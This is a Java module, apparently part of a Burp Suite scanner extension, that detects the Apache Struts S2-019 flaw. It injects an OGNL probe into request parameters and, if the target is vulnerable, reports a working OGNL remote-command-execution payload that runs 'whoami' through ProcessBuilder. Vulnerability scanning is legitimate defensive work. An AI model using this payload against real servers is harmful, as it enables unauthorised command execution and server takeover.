package module;

import burp.*;

import java.net.URLEncoder;

public class S2_019 extends IModule {
    public String poc =
            "debug=command&expression=" +
            "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
            "#out.print('" + injectMark[0] + "')," +
            "#out.print('" + injectMark[1] + "')," +
            "#out.flush()," +
            "#out.close()";
    public String exp =
        "debug=command&expression=" +
        "#a=(new java.lang.ProcessBuilder('whoami')).start()," +
        "#b=#a.getInputStream()," +
        "#c=new java.io.InputStreamReader(#b)," +
        "#d=new java.io.BufferedReader(#c)," +
        "#e=new char[50]," +
        "#d.read(#e)," +
        "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
        "#out.print(new java.lang.String(#e))," +
        "#out.flush()," +
        "#out.close()";

    @Override
    public IScanIssue start() {
        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }

        String[] parameters = poc.split("&");
        for (String parameter: parameters) {
            String[] tmp = parameter.split("=", 2);
            String parameterName = tmp[0];
            String parameterValue = tmp[1];
            IParameter newParameter = helpers.buildParameter(parameterName, URLEncoder.encode(parameterValue), in);
            request = helpers.updateParameter(request, newParameter);
        }
        if (check()) {
            this.detail = URLEncoder.encode(exp).replace("%3D", "=").replace("%26", "&");
            return creatCustomScanIssue();
        }
        return null;
    }
}
